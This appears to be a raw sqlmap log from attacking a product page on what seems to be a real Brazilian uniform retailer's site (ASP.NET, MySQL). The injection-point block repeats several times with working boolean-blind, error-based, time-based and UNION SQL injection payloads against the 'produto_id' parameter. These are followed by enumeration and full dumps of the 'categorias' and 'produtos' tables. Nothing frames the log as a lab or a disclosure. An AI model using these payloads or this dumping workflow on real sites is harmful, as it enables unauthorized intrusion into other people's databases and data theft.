@@ -1,0 +1,203 @@
+sqlmap identified the following injection point(s) with a total of 48 HTTP(s) requests:
+---
+Parameter: produto_id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: produto_id=7 AND 3966=3966
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: produto_id=7 AND (SELECT 1407 FROM(SELECT COUNT(*),CONCAT(0x7162716a71,(SELECT (ELT(1407=1407,1))),0x71706b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: produto_id=7 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: produto_id=7 UNION ALL SELECT NULL,CONCAT(0x7162716a71,0x457545644c686a777058636b787368736d4b565868526b73657a4d4b6c6c744d656d4e6f4773506f,0x71706b7171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- LDZS
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web server operating system: Windows 2008 R2 or 7
+web application technology: ASP.NET, Microsoft IIS 7.5
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] ebtuniformes
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: produto_id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: produto_id=7 AND 3966=3966
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: produto_id=7 AND (SELECT 1407 FROM(SELECT COUNT(*),CONCAT(0x7162716a71,(SELECT (ELT(1407=1407,1))),0x71706b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: produto_id=7 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: produto_id=7 UNION ALL SELECT NULL,CONCAT(0x7162716a71,0x457545644c686a777058636b787368736d4b565868526b73657a4d4b6c6c744d656d4e6f4773506f,0x71706b7171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- LDZS
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web server operating system: Windows 2008 R2 or 7
+web application technology: ASP.NET, Microsoft IIS 7.5
+back-end DBMS: MySQL >= 5.0
+Database: ebtuniformes
+[2 tables]
++------------+
+| categorias |
+| produtos   |
++------------+
+
+Database: ebtuniformes
++------------+---------+
+| Table      | Entries |
++------------+---------+
+| produtos   | 20      |
+| categorias | 11      |
++------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: produto_id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: produto_id=7 AND 3966=3966
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: produto_id=7 AND (SELECT 1407 FROM(SELECT COUNT(*),CONCAT(0x7162716a71,(SELECT (ELT(1407=1407,1))),0x71706b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: produto_id=7 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: produto_id=7 UNION ALL SELECT NULL,CONCAT(0x7162716a71,0x457545644c686a777058636b787368736d4b565868526b73657a4d4b6c6c744d656d4e6f4773506f,0x71706b7171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- LDZS
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web server operating system: Windows 2008 R2 or 7
+web application technology: ASP.NET, Microsoft IIS 7.5
+back-end DBMS: MySQL >= 5.0
+Database: ebtuniformes
+[2 tables]
++------------+
+| categorias |
+| produtos   |
++------------+
+
+Database: ebtuniformes
+Table: categorias
+[11 entries]
++---------------+-----------------+-----------------+
+| categorias_id | categorias_sexo | categorias_nome |
++---------------+-----------------+-----------------+
+| 1             | M               | Cal\xe7a        |
+| 2             | M               | Camisa          |
+| 3             | M               | Jaleco          |
+| 5             | M               | Guarda-P\xf3    |
+| 6             | M               | Avental         |
+| 7             | M               | Camiseta        |
+| 8             | F               | Conjunto        |
+| 9             | F               | Uniforme        |
+| 10            | F               | Bata            |
+| 13            | F               | Touca           |
+| 14            | F               | Keds            |
++---------------+-----------------+-----------------+
+
+Database: ebtuniformes
+Table: produtos
+[20 entries]
++-------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------------------------------------------------------+---------------------------------------------------------------------------------+--------------------------------------+---------------+------------------------------------------+---------------------------------------------------------------------------------------------------------------------+------------------------------------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+
+| produtos_id | produtos_fotoid                                                                                                                                                                                                                                                                                                                                                                                                                                              | produtos_tecido                                             | produtos_obs                                                                    | produtos_name                        | produtos_sexo | produtos_cores                           | produtos_indica                                                                                                     | produtos_tamanhos                                    | produtos_descricao                                                                                                                                                                                                                                                  | produtos_categoria |
++-------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------------------------------------------------------+---------------------------------------------------------------------------------+--------------------------------------+---------------+------------------------------------------+---------------------------------------------------------------------------------------------------------------------+------------------------------------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+
+| 1           | 4723                                                                                                                                                                                                                                                                                                                                                                                                                                                         | Oxford                                                      | NULL                                                                            | CAL\xc7A SOCIAL                      | M             | Marinho e Preto                          | Profissionais da seguran\xe7a, portaria, recep\xe7\xe3o, \xe1reas administrativas.                                  | 38/40=P | 42/44=M | 46/48=G  | 50/52=GG | 54/56=EXGG | Cal\xe7a social com quatro bolsos, sendo 2 laterais e 2 na parte anterior, podendo receber dobra de vin                                                                                                                                                             | 1                  |
+| 2           | 4727                                                                                                                                                                                                                                                                                                                                                                                                                                                         | Grafil (Misto de Poli\xe9ster e Algod\xe3o - n\xe3o amassa) | NULL                                                                            | CAMISA SOCIAL                        | M             | Branca, azul claro                       | Profissionais da seguran\xe7a, portaria, recep\xe7\xe3o, \xe1reas administrativas                                   | NULL                                                 | Varia\xe7\xf5es: - Manga Curta e Longa                                                                                                                                                                                                                              | 2                  |
+| 3           | 4716                                                                                                                                                                                                                                                                                                                                                                                                                                                         | Brim Solasol                                                | Pode ser utilizada em conjunto com Camiseta Polo, Camiseta Gola Careca e Jaleco | CAL\xc7A EM BRIM SOLASOL             | M             | Ver Tabela de Cores                      | Profissionais de manuten\xe7\xe3o, hospital, constru\xe7\xe3o, industrias em geral                                  | NULL                                                 | Varia\xe7\xf5es:\r\n- Meio el\xe1stico na cintura, com passantes para cinto, z\xedper, bot\xe3o de fecho, 2 bolsos na frente e 2 bolsos atr\xe1s.\r\n - El\xe1stico inteiro na cintura, com passante para cinto, 2 bolsos na frente e 2 bolsos atr\xe1s.\r\n        | 1                  |
+| 4           | 4713                                                                                                                                                                                                                                                                                                                                                                                                                                                         | Brim Tap\xe9 e Tergal                                       | NULL                                                                            | JALECO                               | MF            | Ver Tabela de cores                      | Profissionais da Ind\xfastria, Oper\xe1rios da Constru\xe7\xe3o, Serventes, Atendentes de Postos de Combust\xedveis | NULL                                                 | Varia\xe7\xf5es:\r\n- Palet\xf3 com abotoamento frontal em 3 bot\xf5es, um bolso no peito e 2 bolsos inferiores abaixo da cintura\r\n\r\n- Fechado com gola italiana e com um bolso no peito\r\n \r\n- Fechado com gola p\xf3lo com um bot\xe3o e um bolso no peito | 3                  |
+| 5           | 4708.jpg" width="229" class="imgSmall" height="345" /></div> \r\n                                                                        \t<div class="jqzoom"><img border='0' src='images/big/small/thumbs/4672.jpg' jqimg="images/big/small/4672.jpg" style='padding:4px 10px 2px 12px;'></div> \r\n                                                                               \t<div class="jqzoom"><img border='0' src='images/big/small/thumbs/4668 | Brim Leve, Tergal ou Oxford                                 | NULL                                                                            | CONJUNTO CAL\xc7A /JALECO FEMININO   | MF            | NULL                                     | NULL                                                                                                                | NULL                                                 | Varia\xe7\xe3o: \r\n- Aplica\xe7\xe3o de bordado ingl\xeas                                                                                                                                                                                                          | 8                  |
+| 6           | 4685                                                                                                                                                                                                                                                                                                                                                                                                                                                         | Oxford                                                      | NULL                                                                            | CONJUNTO CAL\xc7A/COLETE             | F             | Branco, Marinho ou Preto                 | Uniformes para Bab\xe1s, Loja e Escrit\xf3rio (Recepcionista e  Assessoria)                                         | NULL                                                 | <blank>                                                                                                                                                                                                                                                             | 8                  |
+| 7           | 4680                                                                                                                                                                                                                                                                                                                                                                                                                                                         | Oxford                                                      | NULL                                                                            | UNIFORME PARA COPEIRA                | F             | Marinho e Preto                          | NULL                                                                                                                | NULL                                                 | Varia\xe7\xe3o:\r\n- Vestido com Meio Avental\r\n- Enfeitado com bordado ingl\xeas\r\n                                                                                                                                                                              | 9                  |
+| 8           | 4701                                                                                                                                                                                                                                                                                                                                                                                                                                                         | Tergal                                                      | NULL                                                                            | UNIFORME PARA COPEIRA OU ARRUMADEIRA | M             | Cinza Claro, Marinho, Azul Claro e Preto | Copeira, arrumadeira e dom\xe9stica                                                                                 | NULL                                                 | Varia\xe7\xe3o:\r\n- Vestido e Avental Meio Corpo\r\n- Bordado aplicado na gola e no avental\r\n                                                                                                                                                                    | 9                  |
+| 9           | 4688                                                                                                                                                                                                                                                                                                                                                                                                                                                         | Tergal e Oxford                                             | NULL                                                                            | BATA FEMININA PROFISSIONAL           | F             | NULL                                     | Servi\xe7o em Geral                                                                                                 | NULL                                                 | <blank>                                                                                                                                                                                                                                                             | 10                 |
+| 10          | 4691                                                                                                                                                                                                                                                                                                                                                                                                                                                         | Tergal, Oxford ou Algod\xe3o                                | NULL                                                                            | JALECO FEMININO                      | F             | NULL                                     | Profissionais da \xe1rea m\xe9dica e da educa\xe7\xe3o                                                              | NULL                                                 | Varia\xe7\xe3o:\r\n- Guarda-p\xf3\r\n                                                                                                                                                                                                                               | 3                  |
+| 24          | imagesKeds1                                                                                                                                                                                                                                                                                                                                                                                                                                                  | NULL                                                        | NULL                                                                            | KEDS                                 | F             | Branco e Preto                           | empregada dom\xe9stica, recepcionista e copeiras                                                                    | NULL                                                 | NULL                                                                                                                                                                                                                                                                | 14                 |
+| 22          | NULL                                                                                                                                                                                                                                                                                                                                                                                                                                                         | NULL                                                        | NULL                                                                            | LA\xc7O DE CABELO                    | F             | NULL                                     | NULL                                                                                                                | NULL                                                 | Varia\xe7\xe3o: - Presilha para rabo de cabelo                                                                                                                                                                                                                      | 15                 |
+| 23          | BotinadeUso                                                                                                                                                                                                                                                                                                                                                                                                                                                  | NULL                                                        | NULL                                                                            | BOTINA / BOTA                        | MF            | NULL                                     | Trabalhadores em Geral                                                                                              | NULL                                                 | Varia\xe7\xf5es:\r\n- Cano Curto\r\n- Com ou sem cadar\xe7o\r\n                                                                                                                                                                                                     | 15                 |
+| 21          | 4668                                                                                                                                                                                                                                                                                                                                                                                                                                                         | NULL                                                        | NULL                                                                            | TOUCA                                | F             | NULL                                     | Cozinheira, Copeira e Arrumadeira                                                                                   | NULL                                                 | NULL                                                                                                                                                                                                                                                                | 13                 |
+| 17          | 4696.jpg" width="229" class="imgSmall" height="345" /></div> \r\n                                                                        \t<div class="jqzoom"><img border='0' src='images/big/small/thumbs/4709                                                                                                                                                                                                                                             | Tergal, Oxford e Brim Tap\xe9                               | NULL                                                                            | AVENTAL AVULSO                       | MF            | NULL                                     | Funcion\xe1rios de restaurantes                                                                                     | NULL                                                 | Varia\xe7\xe3o:\r\n- Tamanho \xfanico\r\n- Al\xe7a regul\xe1vel\r\n\r\n                                                                                                                                                                                             | 6                  |
+| 18          | 4733                                                                                                                                                                                                                                                                                                                                                                                                                                                         | Brim, Oxford e Tergal                                       | NULL                                                                            | GUARDA-P\xd3 E CAPA                  | M             | NULL                                     | NULL                                                                                                                | NULL                                                 | Varia\xe7\xf5es:\r\n- Capa com manga curta, 3 bolsos e abotoamento frontal\r\n- Guarda-p\xf3 com manga curta ou longa e 3 bolsos                                                                                                                                    | 5                  |
+| 19          | 4736.jpg" width="229" class="imgSmall" height="345" /></div> \r\n                                                                        \t<div class="jqzoom"><img border='0' src='images/big/small/thumbs/4685.jpg' jqimg="images/big/small/4685.jpg" style='padding:4px 10px 2px 12px;'></div> \r\n                                                                               \t<div class="jqzoom"><img border='0' src='images/big/small/thumbs/4691 | NULL                                                        | NULL                                                                            | CAMISETA                             | MF            | Variadas                                 | NULL                                                                                                                | <blank>                                              | Varia\xe7\xf5es:\r\n- Tradicional, com manga curta e manga longa\r\n- Baby Look\r\n                                                                                                                                                                                 | 7                  |
+| 20          | 001.jpg" width="229" class="imgSmall" height="345" /></div> \r\n                                                                        \t<div class="jqzoom"><img border='0' src='images/big/small/thumbs/002.jpg' jqimg="images/big/small/002.jpg" style='padding:4px 10px 2px 12px;'></div> \r\n                                                                               \t<div class="jqzoom"><img border='0' src='images/big/small/thumbs/003     | NULL                                                        | NULL                                                                            | CAMISETA POLO                        | MF            | Variadas                                 | NULL                                                                                                                | NULL                                                 | Varia\xe7\xf5es:\r\n- Tradicional\r\n- Baby Look\r\n                                                                                                                                                                                                                | 7                  |
+| 25          | Moleka1                                                                                                                                                                                                                                                                                                                                                                                                                                                      | NULL                                                        | NULL                                                                            | MOLECA                               | NULL          | Branco, Preto e Marinho                  | NULL                                                                                                                | NULL                                                 | NULL                                                                                                                                                                                                                                                                | 15                 |
+| 26          | BotaBranca                                                                                                                                                                                                                                                                                                                                                                                                                                                   | NULL                                                        | NULL                                                                            | BOTA DE BORRACHA                     | NULL          | Branca e Preta                           | NULL                                                                                                                | NULL                                                 | Varia\xe7\xe3o:\r\n- Cano Curto e Longo\r\n                                                                                                                                                                                                                         | 15                 |
++-------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------------------------------------------------------+---------------------------------------------------------------------------------+--------------------------------------+---------------+------------------------------------------+---------------------------------------------------------------------------------------------------------------------+------------------------------------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: produto_id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: produto_id=7 AND 3966=3966
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: produto_id=7 AND (SELECT 1407 FROM(SELECT COUNT(*),CONCAT(0x7162716a71,(SELECT (ELT(1407=1407,1))),0x71706b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: produto_id=7 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: produto_id=7 UNION ALL SELECT NULL,CONCAT(0x7162716a71,0x457545644c686a777058636b787368736d4b565868526b73657a4d4b6c6c744d656d4e6f4773506f,0x71706b7171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- LDZS
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web server operating system: Windows 2008 R2 or 7
+web application technology: ASP.NET, Microsoft IIS 7.5
+back-end DBMS: MySQL >= 5.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: produto_id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: produto_id=7 AND 3966=3966
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: produto_id=7 AND (SELECT 1407 FROM(SELECT COUNT(*),CONCAT(0x7162716a71,(SELECT (ELT(1407=1407,1))),0x71706b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: produto_id=7 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: produto_id=7 UNION ALL SELECT NULL,CONCAT(0x7162716a71,0x457545644c686a777058636b787368736d4b565868526b73657a4d4b6c6c744d656d4e6f4773506f,0x71706b7171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- LDZS
+    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web server operating system: Windows 2008 R2 or 7
+web application technology: ASP.NET, Microsoft IIS 7.5
+back-end DBMS: MySQL >= 5.0
